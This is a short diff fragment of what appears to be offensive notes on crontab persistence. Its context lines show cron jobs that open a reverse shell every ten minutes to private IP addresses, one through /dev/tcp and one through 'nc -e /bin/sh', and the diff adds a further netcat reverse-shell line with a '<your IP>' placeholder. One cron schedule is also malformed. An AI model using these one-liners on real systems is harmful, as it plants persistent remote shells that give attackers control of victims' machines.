@@ -58,6 +58,9 @@ crontab -e
 */10 * * * * 0<&196;exec 196<>/dev/tcp/192.168.1.102/5556; sh <&196 >&196 2>&196
 ```
 
+    /bin/sh | nc <your IP> <any unfiltered port>
+
+
 ```
 /10 * * * * nc -e /bin/sh 192.168.1.21 5556
 ```
